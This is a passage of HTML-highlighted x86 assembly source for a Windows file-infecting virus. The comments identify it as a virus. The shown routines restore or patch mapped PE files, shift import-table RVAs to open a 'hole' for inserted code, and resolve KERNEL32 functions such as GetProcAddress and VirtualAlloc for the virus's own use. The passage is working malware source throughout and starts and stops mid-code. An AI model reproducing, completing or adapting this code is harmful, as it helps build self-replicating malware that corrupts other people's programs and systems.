   </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AddUndoAction</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function gets the undo buffer and restores the data we saved. We must</span><span class="sc0">
</span><span class="sc1">;; do this because there isn't a way of telling the Kernel32 to discard the</span><span class="sc0">
</span><span class="sc1">;; changes made to the mapping, so we have to make it manually. </span><span class="sc0">
</span><span class="sc5">UndoChanges</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfUndoActions</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the counter of</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">; undo actions. If 0, exit.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Ret</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OtherBuffers</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@@Loop01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the address of the DWORD to restore</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the value to put for restoration</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Restore it</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; Next element</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; If we haven't restored all, loop</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop01</span><span class="sc0">
        </span><span class="sc5">@@Ret</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">UndoChanges</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function updates the import table, and returns the addresses of the</span><span class="sc0">
</span><span class="sc1">;; APIs the virus needs on execution.</span><span class="sc0">
</span><span class="sc1">;; Entries:</span><span class="sc0">
</span><span class="sc1">;; EDI = Virtual address of hole</span><span class="sc0">
</span><span class="sc1">;; ECX = Size of hole</span><span class="sc0">
</span><span class="sc1">;; If we use EDI = 0FFFFFFFFh as the address of the hole, nothing is updated</span><span class="sc0">
</span><span class="sc1">;; (it's logical, since all the RVAs are below this value), but the virtual</span><span class="sc0">
</span><span class="sc1">;; function addresses that we must use from the import table are retrieved.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; As an error control, we use the addresses of the functions that we expect</span><span class="sc0">
</span><span class="sc1">;; to be retrieved here. If any of these functions (ExitProcess, GetProcAddress</span><span class="sc0">
</span><span class="sc1">;; and GetModuleHandleA/W) are 0, then an error happened or any of them isn't</span><span class="sc0">
</span><span class="sc1">;; imported.</span><span class="sc0">
</span><span class="sc5">UpdateImports</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the import header addr.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ImportsUpdated</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0"> </span><span class="sc1">; Get the physical address.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; If error, exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ImportsUpdated</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_Loop00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the RVA of the module name.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; If no name, error!</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ImportsUpdated</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">           </span><span class="sc1">; Fix it</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateImportsOK_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddUndoAction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; [EBX+0Ch]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">


        </span><span class="sc5">@@UpdateImportsOK_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Initialize this flag</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32Imports</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0"> </span><span class="sc1">; Get the physical address</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; of the module name</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_Next00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Check if it's KERNEL32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1F1F1F1Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'nrek'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1F1F1F1Fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_Next00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFF1F1Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'23le'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">0FFFF1F1Fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_Next00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; If it is, set the flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32Imports</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the RVA to the function names</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImportsOK_04</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">; Get the physical address of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; array</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImportsOK_04</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_Loop01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get an RVA from the array</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImportsOK_02</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">             </span><span class="sc1">; Ordinal?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_UpdatedOK</span><span class="sc0">    </span><span class="sc1">; Then, don't update</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32Imports</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; KERNEL32 module?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; If not, don't check the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_NotKernel32</span><span class="sc0">  </span><span class="sc1">; name</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0"> </span><span class="sc1">; Get the physical address</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; of the function name</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_UnknownFunction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'tixE'</span><span class="sc0">                </span><span class="sc1">; Check for ExitProcess</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_ExitProcess00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MteG'</span><span class="sc0">                </span><span class="sc1">; Check for GetModuleHandle</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_GetModuleHandle00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'PteG'</span><span class="sc0">                </span><span class="sc1">; Check for GetProcAddress</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_GetProcAddress00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'triV'</span><span class="sc0">                </span><span class="sc1">; Check for VirtualAlloc</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_UnknownFunction</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_VirtualAlloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'loc'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_UnknownFunction</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; VirtualAlloc ID</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_SaveFunctionAddress</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_GetProcAddress00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Acor'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_UnknownFunction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; GetProcAddress ID</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_SaveFunctionAddress</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_ExitProcess00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'corP'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_UnknownFunction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; ExitProcess ID</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_SaveFunctionAddress</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_GetModuleHandle00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'naHe'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_UnknownFunction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Aeld'</span><span class="sc0">               </span><span class="sc1">; Check for GetModuleHandleA</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_GetModuleHandleAFound</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Weld'</span><span class="sc0">               </span><span class="sc1">; Check for GetModuleHandleW</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_UnknownFunction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_GetModuleHandleFound</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_GetModuleHandleAFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_GetModuleHandleFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleMode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; Set the mode: A or W</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; GetModuleHandle ID</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_SaveFunctionAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc1">; EBX = Imports header</span><span class="sc0">
                </span><span class="sc1">; EAX = Physical address of position in names array</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Fix the RVA into the array</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; Position in array</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; If EDI == -1, this is not fixed</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_SetFunctionAddress</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_SetFunctionAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; Set the function address</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_SetVirtualAlloc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_SetGetProcAddress</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_SetExitProcess</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_SetGetModuleHandle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_FunctionSet</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_SetVirtualAlloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_FunctionSet</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_SetGetProcAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_FunctionSet</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_SetExitProcess</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_FunctionSet</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_UnknownFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_Continue00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_NotKernel32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateImports_UpdatedOK</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddUndoAction</span><span class="sc0">         </span><span class="sc1">; Add the undo action for this</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@UpdateImports_UpdatedOK</span><span class="sc4">:</span><span class="sc0">
